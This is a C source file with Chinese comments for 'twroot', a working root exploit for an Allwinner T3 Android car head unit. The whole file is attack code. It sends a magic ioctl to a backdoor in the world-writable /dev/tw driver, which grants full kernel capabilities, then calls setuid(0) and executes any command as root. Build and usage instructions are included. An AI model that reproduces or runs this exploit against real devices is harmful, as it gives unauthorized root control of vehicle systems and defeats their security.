/* twroot —— 利用 /dev/tw 后门一步拿到 root，然后 exec 任意命令
 *
 * 背景
 * ----
 * 这台车机（Allwinner T3 / sun8iw11p1 / Android 4.4.2 / 内核 3.10.65）的内核里
 * 内置了一个叫 `tw` 的字符驱动，注册为 major 247，设备节点 /dev/tw 权限 0666。
 *
 * 对它的 fd 发一个 ioctl，内核会把当前进程的
 *     cred->cap_inheritable / cap_permitted / cap_effective
 * 三个位图全部写成 0xffffffff。于是任意 uid 的进程瞬间拥有 CAP_SETUID，
 * 紧接着 setuid(0) 就会成功。
 *
 *     ioctl(fd, 0x61ff, 0xa55aa55a)
 *
 * 0x61ff == _IO(0x61, 0xff)：无方向位、无 size 参数，magic=0x61，nr=0xff。
 * 0xa55aa55a 是驱动里比对的口令（典型的「魔法数 = 我说了算」写法）。
 *
 * 判据
 * ----
 * 千万不要用 ioctl() 的返回值判断成败 —— 它返回 0 不代表能力真的注入了。
 * 唯一可信的判据是 **setuid(0) 是否成功**，以及之后 getuid()/geteuid() 是否真的是 0。
 * 本程序两条都查，任一不满足即返回非零。
 *
 * 这条路连 no_new_privs 都不怕：能力注入是内核直接改 cred，不经过 execve
 * 的权限提升路径，所以 setuid 位被 nosuid 挡住也没关系。
 *
 * 用法
 * ----
 *     twroot <cmd> [args...]
 *     twroot id
 *     twroot sh -c 'mount | head'      # 设备上没有 head，示例而已
 *
 * 编译（静态链接，不依赖设备上的 linker 与 libc 版本）
 *     arm-linux-gnueabihf-gcc -static -O2 -o twroot src/twroot.c
 *     # aarch64/其他目标同理，只要 libc 里有 ioctl/setuid 即可
 *
 * 诊断信息全部走 stderr，被 exec 的命令输出走 stdout，
 * 所以 `twroot id 2>/dev/null` 只留下命令本身的结果。
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <unistd.h>

#define TW_DEV    "/dev/tw"
#define TW_IOCTL  0x61ffUL       /* _IO(0x61, 0xff) */
#define TW_MAGIC  0xa55aa55aUL   /* 驱动比对的口令 */

/* 把 /proc/self/status 里的 CapInh/CapPrm/CapEff/CapBnd 打出来。
 * 不依赖任何外部工具（这台车机上没有 grep/awk/sed）。 */
static void dump_caps(const char *tag)
{
    static const char *want[] = { "CapInh:", "CapPrm:", "CapEff:", "CapBnd:" };
    FILE *f;
    char line[256];
    int i;

    f = fopen("/proc/self/status", "r");
    if (!f)
        return;

    while (fgets(line, sizeof(line), f)) {
        for (i = 0; i < (int)(sizeof(want) / sizeof(want[0])); i++) {
            if (strncmp(line, want[i], strlen(want[i])) == 0) {
                fprintf(stderr, "[twroot] %-6s %s", tag, line);
                break;
            }
        }
    }
    fclose(f);
}

static void usage(const char *prog)
{
    fprintf(stderr,
            "usage: %s <cmd> [args...]\n"
            "\n"
            "  通过 %s 的能力注入后门把自己变成 root，然后 exec 给定命令。\n"
            "\n"
            "examples:\n"
            "  %s id\n"
            "  %s sh -c 'id; getprop ro.secure'\n",
            prog, TW_DEV, prog, prog);
}

int main(int argc, char **argv)
{
    int fd;

    if (argc < 2) {
        usage(argv[0]);
        return 2;
    }

    fprintf(stderr, "[twroot] before: uid=%d euid=%d gid=%d\n",
            (int)getuid(), (int)geteuid(), (int)getgid());
    dump_caps("before");

    /* ---- 1. 打开后门设备 ---- */
    fd = open(TW_DEV, O_RDWR);
    if (fd < 0) {
        perror("[twroot] open " TW_DEV);
        fprintf(stderr, "[twroot] 这台设备大概没有该后门，"
                        "或者内核不是该 BSP 版本\n");
        return 1;
    }

    /* ---- 2. 能力注入 ---- */
    errno = 0;
    if (ioctl(fd, TW_IOCTL, TW_MAGIC) < 0) {
        fprintf(stderr, "[twroot] ioctl(0x%lx, 0x%lx) failed: %s\n",
                (unsigned long)TW_IOCTL, (unsigned long)TW_MAGIC,
                strerror(errno));
        close(fd);
        return 1;
    }
    close(fd);

    dump_caps("after");

    /* ---- 3. 提权 ----
     * 先 gid 后 uid，顺序不能反：一旦 euid 变成 0 而 gid 没改，
     * 后面的 setgid 就依赖 CAP_SETGID —— 虽然这里 CapEff 已经是全 1，
     * 但保持「先降 gid」的写法在任何环境下都不会出问题。
     * setgid 失败不致命（某些环境本来就没有 gid 0），setuid 失败才算失败。*/
    if (setgid(0) != 0)
        fprintf(stderr, "[twroot] warn: setgid(0): %s (继续)\n", strerror(errno));

    errno = 0;
    if (setuid(0) != 0) {
        fprintf(stderr, "[twroot] setuid(0) failed: %s\n", strerror(errno));
        fprintf(stderr, "[twroot] ⇒ 能力注入没生效，ioctl 返回 0 也不可信\n");
        return 1;
    }

    /* ---- 4. 唯一可信的判据 ---- */
    if (getuid() != 0 || geteuid() != 0) {
        fprintf(stderr, "[twroot] setuid(0) 返回成功但 uid=%d euid=%d，判定失败\n",
                (int)getuid(), (int)geteuid());
        return 1;
    }

    fprintf(stderr, "[twroot] root ok: uid=0 euid=0 gid=%d; exec %s\n",
            (int)getgid(), argv[1]);

    /* ---- 5. 以 root 执行 ---- */
    execvp(argv[1], &argv[1]);

    /* execvp 只在失败时返回 */
    perror("[twroot] execvp");
    return 127;
}
